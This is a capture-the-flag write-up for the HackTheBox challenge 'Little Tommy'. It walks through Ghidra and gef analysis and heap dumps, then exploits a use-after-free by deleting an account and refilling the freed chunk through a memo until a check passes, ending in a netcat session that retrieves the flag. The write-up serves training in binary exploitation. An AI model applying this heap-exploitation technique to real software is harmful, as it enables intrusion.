# Little Tommy

Completed: Yes
Date: Jun 20, 2021 → Jun 20, 2021
Platform: HackTheBox

Open the binary in ghidra.

The program just gets the input from 1 to 5. 

Number 1 - create an account with First name and Last name. Both are the size of 29 bytes plus 3 zero bytes.

The entire account is just First name + Last name + Account balance. The size is 72 bytes.

Number 2 shows you the account.

Number 3 deletes your account.

Number 4 stores the string after your account. The string has a size of no more than 256 bytes.

Number 5 prints the flag if you pass the condition. What is this condition?

```bash
if ((main_account == (char *)0x0) || (*(int *)(main_account + 0x40) != 0x6b637566)) {
        puts("\nNope.");
      }
      else {
        system("/bin/cat flag");
      }
```

```bash
0x0804891e <+706>:   mov    eax,ds:0x804a048
   0x08048923 <+711>:   mov    eax,DWORD PTR [eax+0x40]
   0x08048926 <+714>:   cmp    eax,0x6b637566
   0x0804892b <+719>:   jne    0x804893f <main+739>
   0x0804892d <+721>:   sub    esp,0xc
   0x08048930 <+724>:   push   0x8048bf4
   0x08048935 <+729>:   call   0x80484a0 <system@plt>
```

So, we need to increase the size of our account balance and also make it to be equal to 0x6b637566 or `fuck`. There are no overflows. All sizes are normal, vulnerable functions are not used. Thus, remains to find some vulnerability with the heap. And this is the easy part because you already could see it in option 3 of the program. If you have an account and you'll try to delete it and then use it, it will be used fine. 

Here is the hard part - determine what the heck is with this challenge. I tried to exploit it on my machine, but it wasn't exploited. Then, I saw this: [https://forum.hackthebox.eu/discussion/245/little-tommy](https://forum.hackthebox.eu/discussion/245/little-tommy). There people said that this is easy to exploit remotely.

How to exploit it? Go in `gef`:

```bash
gef➤  b *main + 706
Breakpoint 1 at 0x804891e
gef➤  r
Starting program: /home/kali/Downloads/little_tommy 

#################### Welcome to Little Tommy's Handy yet Elegant and Advanced Program ####################

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number: 1

First name: aaa
Last name: aaaa

Thank you, your account number 134527424.

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number: 4

Please enter memo:
fuckfuckfuck

Thank you, please keep this reference number number safe: 134527504.

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number: 5

Breakpoint 1, 0x0804891e in main ()

gef➤  x/50x $eax
0x804b9c0:      0x00616161      0x00000000      0x00000000      0x00000000
0x804b9d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b9e0:      0x61616161      0x00000000      0x00000000      0x00000000
0x804b9f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804ba00:      0x00000000      0x00000000      0x00000000      0x00000021
0x804ba10:      0x6b637566      0x6b637566      0x6b637566      0x0000000a
0x804ba20:      0x00000000      0x00000000      0x00000000      0x000215d9
```

You can see that the heap contains my `aaa` strings in two blocks of 32 bytes. After them, the one 16 bytes block with zeros and 0x21. After this, the block that stores the memo. Let's continue and free our account:

```bash
gef➤  c
Continuing.

Nope.

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number: 3

Account deleted successfully

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number: 5

Breakpoint 1, 0x0804891e in main ()
```

See the address in eax again:

```bash
gef➤  x/50x $eax
0x804b9c0:      0x00000000      0x0804b010      0x00000000      0x00000000
0x804b9d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b9e0:      0x61616161      0x00000000      0x00000000      0x00000000
0x804b9f0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804ba00:      0x00000000      0x00000000      0x00000000      0x00000021
0x804ba10:      0x6b637566      0x6b637566      0x6b637566      0x0000000a
```

It was freed. Now, the program "must think" that this place in the heap is freed and it can use it again. So, after freeing you use the th option and fill this place with `fuck` until you put fuck in the balance part. This is the solution. If you will try it locally, It won't work. Try remotely:

```bash
$ nc 206.189.20.127 32015

#################### Welcome to Little Tommy's Handy yet Elegant and Advanced Program ####################

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number: 1
1

First name: a
a
Last name: a
a

Thank you, your account number 150452248.

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number: 3
3

Account deleted successfully

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number: 4
4

Please enter memo:
fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck
fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck

Thank you, please keep this reference number number safe: 150452248.

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number: 5
5
HTB{}

1. Create account
2. Display account
3. Delete account
4. Add memo
5. Print flag

Please enter an operation number
```

strdup() function will just store the copy of the string in its argument after allocated account space in the heap.